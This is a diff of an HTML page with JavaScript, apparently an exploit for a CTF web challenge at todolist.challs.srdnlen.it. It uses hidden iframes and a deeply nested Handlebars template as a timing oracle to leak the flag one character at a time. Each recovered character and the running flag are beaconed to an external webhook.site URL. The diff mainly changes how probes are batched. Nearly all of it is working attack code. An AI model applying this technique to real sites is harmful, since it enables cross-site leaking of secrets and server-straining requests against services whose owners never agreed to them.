@@ -2,16 +2,14 @@
 <html><head><meta charset="utf-8"><title>.</title></head><body>
 <pre id="log"></pre>
 <script>
-// ── CONFIG ────────────────────────────────────────────────────────────────────
 const TARGET  = "https://todolist.challs.srdnlen.it";
 const WEBHOOK = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
-const PREFIX  = "srdnlen{leakycs";
+const PREFIX  = "srdnlen{";
 const CHARSET = "abcdefghijklmnopqrstuvwxyz_0123456789}";
 const ARRLEN  = 11;
 const DEPTH   = 7;
-const P_TO    = 3000;   // ms per parallel batch
-const BUDGET  = 52000;  // ms total
-// ─────────────────────────────────────────────────────────────────────────────
+const P_TO    = 3000;   // ms — match will hang this long
+const BUDGET  = 54000;
 
 const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
 const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
@@ -29,137 +27,116 @@ function makeUrl(pos, ch) {
        + "&template=" + encodeURIComponent(tpl);
 }
 
-const sleep = ms => new Promise(r => setTimeout(r, ms));
-
-// Probe all chars in parallel — handles onload, onerror, and timeout
-function probeAll(pos) {
-  return new Promise(resolve => {
-    const results = {};
-    const chars   = CHARSET.split("");
-    let remaining = chars.length;
-
-    function finish(ch, dt, reason) {
-      if (ch in results) return; // already resolved this char
-      results[ch] = { dt, reason };
-      if (--remaining === 0) resolve(results);
-    }
-
-    chars.forEach(ch => {
-      const f  = document.createElement("iframe");
-      f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
-      const t0 = Date.now();
-
-      // Timeout = still loading = MATCH (Handlebars is crunching 11^7 ops)
-      const tid = setTimeout(() => {
-        f.src = "about:blank";
-        try { f.remove(); } catch(e) {}
-        finish(ch, Date.now()-t0, "timeout");
-      }, P_TO);
-
-      // onload = loaded fast = no match
-      f.onload = () => {
-        clearTimeout(tid);
-        try { f.remove(); } catch(e) {}
-        finish(ch, Date.now()-t0, "load");
-      };
-
-      // onerror = X-Frame-Options block or network error
-      // treat as fast (no match) — dt will be small
-      f.onerror = () => {
-        clearTimeout(tid);
-        try { f.remove(); } catch(e) {}
-        finish(ch, Date.now()-t0, "error");
-      };
-
-      f.src = makeUrl(pos, ch);
-      document.body.appendChild(f);
-    });
-  });
-}
-
-// Solo verify a single char
-function probeSolo(pos, ch) {
+// Probe ONE char — returns {dt, reason}
+function probeSingle(pos, ch, timeout) {
   return new Promise(resolve => {
     const f  = document.createElement("iframe");
     f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
+    let done = false;
     const t0 = Date.now();
-    const tid = setTimeout(() => {
-      f.src = "about:blank"; try{f.remove();}catch(e){}
-      resolve({ dt: Date.now()-t0, reason: "timeout" });
-    }, P_TO);
-    f.onload  = () => { clearTimeout(tid); try{f.remove();}catch(e){} resolve({ dt:Date.now()-t0, reason:"load" }); };
-    f.onerror = () => { clearTimeout(tid); try{f.remove();}catch(e){} resolve({ dt:Date.now()-t0, reason:"error" }); };
+
+    function finish(reason) {
+      if (done) return;
+      done = true;
+      clearTimeout(tid);
+      try { f.src = "about:blank"; f.remove(); } catch(e) {}
+      resolve({ dt: Date.now()-t0, reason });
+    }
+
+    const tid = setTimeout(() => finish("timeout"), timeout);
+    f.onload  = () => finish("load");
+    f.onerror = () => finish("error");
     f.src = makeUrl(pos, ch);
     document.body.appendChild(f);
   });
 }
 
-async function run() {
-  const t0  = Date.now();
-  let flag  = PREFIX;
-  print(`[start] prefix=${flag} charset=${CHARSET} P_TO=${P_TO}ms`);
+// Probe chars in small parallel batches of BATCH_SIZE
+// Avoids Chrome connection limit stalling
+const BATCH_SIZE = 6;
 
-  // ── Sanity check: probe a known-false char solo ──────────────────────────
-  print(`[sanity] probing pos=0 char='a' solo (should be fast)...`);
-  const sanity = await probeSolo(0, "a");
-  print(`[sanity] pos=0 char='a' dt=${sanity.dt}ms reason=${sanity.reason}`);
-  if (sanity.reason === "error") {
-    print(`[WARN] iframes are being blocked (X-Frame-Options)! Timing won't work.`);
-    // Still continue — timing oracle via timeout may still work
+async function probeAllBatched(pos) {
+  const chars   = CHARSET.split("");
+  const results = {};
+
+  for (let i = 0; i < chars.length; i += BATCH_SIZE) {
+    const batch = chars.slice(i, i + BATCH_SIZE);
+
+    // Hard deadline: if any iframe in batch stalls, move on after P_TO+500ms
+    const batchPromise = Promise.all(
+      batch.map(ch => probeSingle(pos, ch, P_TO).then(r => { results[ch] = r; }))
+    );
+    const deadline = new Promise(r => setTimeout(r, P_TO + 500));
+    await Promise.race([batchPromise, deadline]);
+
+    // Fill any missing (stalled) chars
+    batch.forEach(ch => {
+      if (!(ch in results)) results[ch] = { dt: P_TO, reason: "stall" };
+    });
+
+    // Early exit if we found a timeout in this batch
+    const hit = batch.find(ch => results[ch].reason === "timeout");
+    if (hit) {
+      // Fill remaining chars as skipped
+      chars.slice(i + BATCH_SIZE).forEach(ch => {
+        results[ch] = { dt: 0, reason: "skipped" };
+      });
+      break;
+    }
   }
-  // ────────────────────────────────────────────────────────────────────────
+
+  return results;
+}
+
+async function run() {
+  const t0 = Date.now();
+  let flag = PREFIX;
+  print(`[start] prefix=${flag}`);
 
   for (let pos = PREFIX.length; pos < 60; pos++) {
     const elapsed = Date.now() - t0;
     if (elapsed > BUDGET) {
-      print(`[budget] stopped at pos ${pos} after ${elapsed}ms`);
+      print(`[budget] stopped at pos=${pos} elapsed=${elapsed}ms`);
+      navigator.sendBeacon(`${WEBHOOK}?BUDGET&flag=${encodeURIComponent(flag)}`);
       break;
     }
 
-    print(`[pos ${pos}] parallel scan... (${elapsed}ms elapsed)`);
-    const results = await probeAll(pos);
+    print(`[pos ${pos}] scanning... elapsed=${elapsed}ms`);
 
-    // Sort by dt descending
+    const results = await probeAllBatched(pos);
+
+    // Sort by dt descending, show top results
     const ranked = Object.entries(results)
-      .map(([ch, r]) => ({ ch, dt: r.dt, reason: r.reason }))
+      .map(([ch, r]) => ({ ch, ...r }))
+      .filter(r => r.reason !== "skipped")
       .sort((a, b) => b.dt - a.dt);
 
     const top5 = ranked.slice(0,5).map(r=>`'${r.ch}'=${r.dt}ms(${r.reason})`).join(" | ");
-    print(`[pos ${pos}] top5: ${top5}`);
+    print(`[pos ${pos}] ${top5}`);
 
-    // Count how many timed out
-    const timedOut = ranked.filter(r => r.reason === "timeout");
-    const errored  = ranked.filter(r => r.reason === "error");
-    print(`[pos ${pos}] timed-out=${timedOut.length} errored=${errored.length} loaded=${ranked.length-timedOut.length-errored.length}`);
+    const timeouts = ranked.filter(r => r.reason === "timeout" || r.reason === "stall");
 
     let hitChar = null;
 
-    if (timedOut.length === 1) {
-      // Exactly one timeout = clean match
-      hitChar = timedOut[0].ch;
-      print(`[HIT-clean] pos=${pos} char='${hitChar}' (only timeout)`);
-    } else if (timedOut.length > 1) {
-      // Multiple timeouts = network congestion, verify each solo
-      print(`[AMBIGUOUS] ${timedOut.length} timeouts — verifying solo...`);
-      for (const r of timedOut) {
-        const v = await probeSolo(pos, r.ch);
-        print(`[VERIFY] pos=${pos} char='${r.ch}' solo=${v.dt}ms reason=${v.reason}`);
-        if (v.reason === "timeout") {
-          hitChar = r.ch;
-          print(`[HIT-verified] pos=${pos} char='${hitChar}'`);
-          break;
-        }
+    if (timeouts.length === 1) {
+      hitChar = timeouts[0].ch;
+      print(`[HIT] pos=${pos} char='${hitChar}' clean timeout`);
+    } else if (timeouts.length > 1) {
+      // Verify each timeout candidate solo
+      print(`[VERIFY] ${timeouts.length} candidates: ${timeouts.map(r=>r.ch).join(",")}`);
+      for (const r of timeouts) {
+        const v = await probeSingle(pos, r.ch, P_TO);
+        print(`[VERIFY] '${r.ch}' solo=${v.dt}ms ${v.reason}`);
+        if (v.reason === "timeout") { hitChar = r.ch; break; }
       }
-    } else if (timedOut.length === 0 && errored.length < CHARSET.length) {
-      // Nothing timed out — use ratio heuristic on loaded ones
+    } else {
+      // No timeout — ratio heuristic
       const loaded = ranked.filter(r => r.reason === "load");
-      if (loaded.length >= 2) {
-        const best   = loaded[0];
-        const second = loaded[1];
-        const ratio  = best.dt / Math.max(1, second.dt);
-        if (best.dt > 800 && ratio > 3.0) {
-          print(`[HIT-ratio] pos=${pos} char='${best.ch}' ${best.dt}ms vs ${second.dt}ms ratio=${ratio.toFixed(1)}x`);
-          hitChar = best.ch;
+      if (loaded.length >= 2 && loaded[0].dt > 600) {
+        const ratio = loaded[0].dt / Math.max(1, loaded[1].dt);
+        if (ratio > 3.0) {
+          hitChar = loaded[0].ch;
+          print(`[HIT-ratio] pos=${pos} char='${hitChar}' ratio=${ratio.toFixed(1)}x`);
         }
       }
     }
@@ -170,7 +147,7 @@ async function run() {
       navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
       if (hitChar === "}") break;
     } else {
-      print(`[MISS] pos=${pos} — no confident match. Check sanity output above.`);
+      print(`[MISS] pos=${pos} — stopping`);
       navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
       break;
     }
